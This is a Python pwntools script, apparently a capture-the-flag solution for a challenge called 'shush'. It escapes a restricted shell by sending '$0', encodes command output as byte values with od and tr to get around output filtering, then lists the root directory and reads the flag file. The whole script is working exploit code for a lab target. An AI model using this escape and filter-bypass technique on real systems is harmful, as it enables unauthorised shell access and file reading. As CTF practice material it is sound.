#!/usr/bin/env python3

from pwn import *

io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process("./shush")

def decode(data: str):
    data = list(filter(lambda x: x != "", data.split("-")))
    return "".join([chr(int(x)) for x in data])

def run(cmd: str):
    BASE_CMD = "{cmd} | od -An -tu1 | tr ' ' '-'"
    io.sendlineafter(b"$ ", b"$0")
    cmd = BASE_CMD.format(cmd=cmd)
    print(f"Running: {cmd}")
    io.sendline(cmd.encode())
    io.sendline(b"exit")

    resp = io.recvuntil(b"sh[ush]")[:-9].decode().split("\n")
    output = ""
    for line in resp:
        line = decode(line)
        output += line

    io.sendline(b"exit") # so that we get the "sh[ush]" prompt:
    io.recvline()
    return output

output = run("ls /").split("\n")

idx = 0
for i, line in enumerate(output):
    if line.startswith("flag"):
        idx = i
        break

flag = run(f"cat /{output[idx]}")
print(f"Flag: {flag}")

io.interactive()